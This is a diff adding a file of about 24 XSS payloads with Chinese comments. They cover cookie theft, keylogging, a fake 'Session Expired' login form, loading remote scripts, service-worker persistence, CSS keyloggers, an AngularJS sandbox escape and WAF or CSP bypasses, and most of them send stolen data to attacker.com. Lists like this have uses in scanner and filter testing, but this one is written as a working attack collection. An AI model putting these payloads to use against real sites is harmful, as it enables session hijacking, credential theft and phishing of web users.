@@ -1,0 +1,44 @@
+# XSS - Cookie 窃取回传攻击者服务器
+<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
+# XSS - 键盘记录回传攻击者服务器
+<script>document.onkeypress=function(e){new Image().src='http://attacker.com/k?k='+e.key}</script>
+# XSS - 页面内容劫持（伪造登录钓鱼页面）
+<script>document.body.innerHTML='<h1>Session Expired</h1><form action=http://attacker.com/steal method=post><input name=user><input name=pass type=password><input type=submit></form>'</script>
+# XSS - SVG onload 窃取 Cookie 回传
+<svg/onload=fetch('http://attacker.com/'+document.cookie)>
+# XSS - img onerror 窃取 Cookie（base64 编码绕过 WAF）
+<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vJytkb2N1bWVudC5jb29raWUp'))>
+# XSS - DOM 注入加载远程恶意脚本
+"><script>document.write('<script src=http://attacker.com/evil.js><\/script>')</script>
+# XSS - 大小写混淆绕过 script 过滤（窃取 Cookie 回传）
+<ScRiPt>new Image().src='http://attacker.com/c?'+document.cookie</sCrIpT>
+# XSS - iframe 全屏加载远程钓鱼页面
+<iframe src="http://attacker.com/phish" width=100% height=100%>
+# XSS - body onload 重定向到钓鱼页面
+<body onload=document.location='http://attacker.com/phish'>
+# XSS - CSS 注入窃取 CSRF Token 和敏感数据
+<style>@import url('http://attacker.com/steal?d='+document.cookie+'&t='+document.querySelector('[name=csrf]').value)</style>
+# XSS - mXSS 突变型 XSS（通过 innerHTML 变异绕过净化）
+<listing><img src=1 onerror=alert(1)></listing>
+# XSS - SVG foreignObject 嵌入 HTML 窃取数据
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><script>new Image().src='http://attacker.com/c?'+document.cookie</script></body></foreignObject></svg>
+# XSS - JSONP 端点劫持 + CSP 绕过
+<script src="http://victim.com/jsonp?callback=fetch('http://attacker.com/'+document.cookie)"></script>
+# XSS - 注册 Service Worker 实现持久化劫持
+<script>navigator.serviceWorker.register('http://attacker.com/sw.js')</script>
+# XSS - 利用 postMessage 跨窗口窃取数据
+<script>window.addEventListener('message',function(e){new Image().src='http://attacker.com/'+e.data})</script>
+# XSS - CSS keylogger（通过 CSS 属性选择器逐字符窃取输入）
+<style>input[type=password][value^="a"]{background:url(http://attacker.com/a)}input[type=password][value^="b"]{background:url(http://attacker.com/b)}</style>
+# XSS - data:text/html iframe 绕过 CSP
+<iframe src="data:text/html,<script>new Image().src='http://attacker.com/'+parent.document.cookie</script>">
+# XSS - 利用 window.name 跨域传输窃取数据（XSS 沙箱逃逸）
+<script>eval('window.name="<script>fetch(`http://attacker.com/`+document.cookie)<\/script>"')</script>
+# XSS - AngularJS 沙箱逃逸 (1.0-1.5)
+{{constructor.constructor('new Image().src="http://attacker.com/"+document.cookie')()}}
+# XSS - DOM Clobbering 劫持全局变量实现 XSS
+<form id=x><output id=y>you</output></form><form name=x><input name=parentNode></form><script>alert(x.y.value)</script>
+# XSS - script 标签拆分绕过（字符串拼接）
+<script>eval("new"+' Image().src="http://attacker.com/"+docu'+'ment.cookie')</script>
+# XSS - HTML5 新标签 onfocus 窃取 Cookie 回传
+<details open ontoggle=new Image().src='http://attacker.com/'+document.cookie>
